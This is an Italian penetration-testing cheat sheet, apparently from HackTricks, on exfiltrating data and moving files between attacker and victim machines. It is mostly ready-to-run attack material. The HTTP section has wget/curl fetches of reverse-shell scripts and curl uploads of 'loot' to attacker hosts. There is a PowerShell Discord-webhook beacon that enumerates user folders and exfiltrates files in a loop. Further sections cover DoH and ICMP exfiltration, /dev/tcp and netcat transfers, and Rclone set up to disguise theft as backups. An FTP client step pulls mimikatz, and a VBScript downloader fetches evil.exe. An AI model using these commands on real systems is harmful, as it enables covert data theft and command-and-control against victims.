# Esfiltrazione

> [!TIP]
> Per un esempio end-to-end di staging del loot in `C:\Users\Public` ed esfiltrazione con Rclone per imitare backup legittimi, consulta il flusso di lavoro seguente.

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## Domini comunemente autorizzati per esfiltrare informazioni

Consulta [https://lots-project.com/](https://lots-project.com/) per trovare domini comunemente autorizzati che possono essere sfruttati

## Copia e incolla Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Caricare file

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**SimpleHttpServer che stampa GET e POST (anche gli header)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Modulo Python [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **Server HTTPS**
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
### HTTP/3 / QUIC

Se i controlli di egress sono configurati per l'ispezione del **TCP/443** classico, ma sono permissivi con **UDP/443**, forzare **HTTP/3** può spostare il trasferimento su **QUIC** invece che su TLS-over-TCP. L'endpoint dell'attaccante deve supportare nativamente HTTP/3, ad esempio tramite un reverse proxy o un endpoint di upload che pubblicizzi già `Alt-Svc: h3`.
```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```
Un paper di ricerca del 2025 (QUIC-Exfil) ha rilevato che gli header cifrati di QUIC e i cambi dinamici degli indirizzi possono rendere più difficile il rilevamento dell'exfiltration a livello di firewall rispetto ai canali basati su TLS o DNS, e ha dimostrato un metodo basato su server-preferred-address che maschera l'exfiltration come una migrazione della connessione lato server.<sup>[[9]](#references)</sup>

### Upload pre-signed / delegated su object-storage

Quando puoi creare o ottenere un **signed URL** a breve durata, alla vittima serve solo un normale client HTTPS. Questo evita di installare cloud SDK o credenziali a lunga durata sull'host.<sup>[[8]](#references)</sup> Può inoltre confondersi con il traffico comune di object-storage.

**Linux / macOS (AWS S3 pre-signed `PUT`)**
```bash
curl -X PUT -T loot.7z \
-H 'Content-Type: application/octet-stream' \
'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```
**Windows PowerShell (AWS S3 pre-signed `PUT`)**
```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
-ContentType 'application/octet-stream' `
-Uri $presignedUrl
```
**Azure Blob SAS URL**
```bash
curl -X PUT --data-binary @loot.7z \
-H 'x-ms-blob-type: BlockBlob' \
-H 'Content-Type: application/octet-stream' \
'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```
Note:
- Le pre-signed URLs / i token SAS solitamente limitano il **path**, il **metodo HTTP** e la **scadenza**.<sup>[[8]](#references)[[10]](#references)</sup>
- Per Azure Blob `Put Blob`, `x-ms-blob-type: BlockBlob` è obbligatorio.<sup>[[10]](#references)</sup>
- Questo pattern funziona bene con `curl`, `Invoke-WebRequest` o qualsiasi implant personalizzato in grado di eseguire un `PUT` HTTPS raw.

### goshs

[goshs](https://github.com/patrickhener/goshs) è un sostituto single-binary di `python3 -m http.server`.<sup>[[4]](#references)</sup>
Supporta upload, download, WebDAV, SFTP, SMB, TLS, autenticazione, share links e funzionalità di collaborazione OOB (DNS, SMTP, acquisizione di hash NTLM).<sup>[[4]](#references)</sup>
```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```
## Webhooks (Discord/Slack/Teams) per C2 & Data Exfiltration

I Webhooks sono endpoint HTTPS write-only che accettano JSON e parti di file opzionali. Sono comunemente consentiti verso domini SaaS affidabili e non richiedono OAuth/API key, il che li rende utili per beaconing ed exfiltration con poca frizione.<sup>[[5]](#references)[[6]](#references)</sup>

Idee chiave:
- Endpoint: Discord usa https://discord.com/api/webhooks/<id>/<token>
- POST multipart/form-data con una parte denominata payload_json contenente {"content":"..."} e una o più parti file opzionali denominate file.
- Pattern del loop dell’operatore: beacon periodico -> ricognizione delle directory -> exfiltration mirata dei file -> dump della ricognizione -> sleep. HTTP 204 NoContent/200 OK conferma la consegna.

PowerShell PoC (Discord):
```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
param([string]$Text)
$payload = @{ content = $Text } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
param([string]$Path, [string]$Name)
if (-not (Test-Path $Path)) { return }
$bytes = [System.IO.File]::ReadAllBytes($Path)
$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$mp.Add($fileContent, "file", $Name)
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
$ctr++
# Beacon
$beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
Send-DiscordText -Text $beacon

# Every 2nd: quick folder listing
if ($ctr % 2 -eq 0) {
$dirs = @("Documents","Desktop","Downloads","Pictures")
$acc = foreach ($d in $dirs) {
$p = Join-Path $env:USERPROFILE $d
$items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
}
Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
}

# Every 3rd: targeted exfil
if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

# Every 4th: basic recon
if ($ctr % 4 -eq 0) {
$who = whoami
$ip  = ipconfig | Out-String
$tmp = Join-Path $env:TEMP "recon.txt"
"whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
Send-DiscordFile -Path $tmp -Name "recon.txt"
}

Start-Sleep -Seconds 20
}
```
Note:
- Pattern simili si applicano ad altre collaboration platform (Slack/Teams) che usano i loro incoming webhook; adatta l'URL e lo schema JSON di conseguenza.
- Per la DFIR degli artefatti della cache di Discord Desktop e il recupero di webhook/API, consulta la pagina correlata qui sotto.<sup>[[7]](#references)</sup>

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Rclone (esfiltrazione da cloud/object-storage)

Gli operatori moderni spesso **mettono in staging il bottino localmente** e poi usano [Rclone](https://rclone.org/) per far sembrare il trasferimento una normale attività di backup o sincronizzazione. Un pattern pratico è:

1. Un remote normale (`s3`, `webdav`, `drive`, `mega`, ...)
2. Un wrapper `crypt` in modo che **contenuti e nomi dei file siano cifrati lato client**
3. Un wrapper `chunker` opzionale se il provider impone limiti alle dimensioni degli oggetti o se vuoi unità di upload più piccole
```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
--transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```
Note:
- `crypt` può cifrare sia il contenuto sia i nomi dei file.<sup>[[3]](#references)</sup>
- `chunker` suddivide in modo trasparente i file di grandi dimensioni e li ricompone durante il download.<sup>[[11]](#references)</sup>
- `rclone.conf` memorizza i secret di `crypt` in forma **offuscata**, non offre una protezione robusta dei dati at-rest.<sup>[[3]](#references)</sup> Per operazioni di breve durata, preferisci una configurazione temporanea dedicata e rimuovila al termine. Se devi conservarla più a lungo, preferisci una gestione cifrata della configurazione (`RCLONE_CONFIG_PASS` / `--password-command`) invece di lasciare un `rclone.conf` non protetto sul disco.<sup>[[11]](#references)</sup>
- Se il target sincronizza già **OneDrive**, **Google Drive** o **Dropbox**, copiare il loot nella directory sincronizzata può sfruttare un client già approvato invece di introdurre un nuovo binary per il trasferimento.

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### FTP server (python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### Server FTP (NodeJS)
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### Server FTP (pure-ftp)
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** client
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
## SMB

Kali come server
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Oppure crea una condivisione SMB **usando samba**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
Windows
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
### goshs
[goshs](https://github.com/patrickhener/goshs) è un'alternativa costituita da un singolo binario che serve file tramite SMB e acquisisce gli hash NTLM dai client che si connettono.<sup>[[4]](#references)</sup>
```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```
## SCP

L'attaccante deve avere SSHd in esecuzione.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

Se la vittima dispone di SSH, l'attaccante può montare una directory dalla vittima sull'attaccante.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### Scaricare un file dalla vittima
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Caricare file sulla vittima
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
grazie a **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## DNS over HTTPS (DoH)

Se il DNS classico su UDP/53 è rumoroso o bloccato, ma l'HTTPS in uscita è ampiamente consentito, il consueto pattern di exfiltration tramite DNS label può essere incluso in richieste **DoH** verso un resolver pubblico. Mantieni ogni label ben al di sotto del limite DNS di 63 byte e usa un alfabeto compatibile con DNS, come Base32.
```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
nl -nrz -w4 -s. | while read chunk; do
curl --http2 -s \
-H 'accept: application/dns-json' \
"https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
>/dev/null
done
```
Sul server DNS authoritative per `exf.attacker.tld`, ordina le query in base al prefisso numerico e ricostruisci lo stream Base32. In questo modo il trasporto rimane all'interno di HTTPS verso il resolver invece di usare il classico DNS UDP/53.<sup>[[2]](#references)</sup>

Per gli strumenti completi per il tunneling DNS bidirezionale (`iodine`, `dnscat2`, ecc.), consulta [la pagina sul tunneling](tunneling-and-port-forwarding.md).

## **SMTP**

Se puoi inviare dati a un server SMTP, puoi crearne uno per ricevere i dati con Python:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
### goshs

[goshs](https://github.com/patrickhener/goshs) può avviare rapidamente un server SMTP per intercettare callback email durante scenari di exfiltration OOB.<sup>[[4]](#references)</sup>
```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```
Le email ricevute e i callback vengono visualizzati direttamente nell'output del terminale.  
Può essere combinato con il DNS callback server per una copertura OOB completa:
```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```
## TFTP

Per impostazione predefinita in XP e 2003 (negli altri deve essere aggiunto esplicitamente durante l'installazione)

In Kali, **avviare il server TFTP**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Server TFTP in Python:**
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
In **victim**, connettiti al server Kali:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Scarica un file con un oneliner PHP:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Vittima**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Il programma `debug.exe` non consente solo di ispezionare i binari, ma ha anche la **capacità di ricostruirli a partire dall'hex**. Ciò significa che, fornendo l'hex di un binario, `debug.exe` può generare il file binario. Tuttavia, è importante notare che debug.exe ha una **limitazione: può assemblare file fino a 64 kb**.<sup>[[1]](#references)</sup>
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
Quindi copia e incolla il testo nella windows-shell e verrà creato un file chiamato nc.exe.

## References

- [1] [Trasferimento di file su Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [3] [Backend `crypt` di Rclone](https://rclone.org/crypt/)
- [4] [goshs](https://github.com/patrickhener/goshs)
- [5] [Discord come C2 e le prove memorizzate nella cache lasciate indietro](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [6] [Webhook di Discord - Esecuzione di un webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [7] [Discord Forensic Suite (parser della cache)](https://github.com/jwdfir/discord_cache_parser)
- [8] [Caricamento di oggetti con URL presigned - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [9] [QUIC-Exfil: sfruttamento della funzionalità Server Preferred Address di QUIC per eseguire attacchi di esfiltrazione dei dati](https://arxiv.org/abs/2505.05292)
- [10] [Put Blob (REST API) - Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
- [11] [Documentazione di Rclone](https://rclone.org/docs/#configuration-encryption)
{{#include ../banners/hacktricks-training.md}}
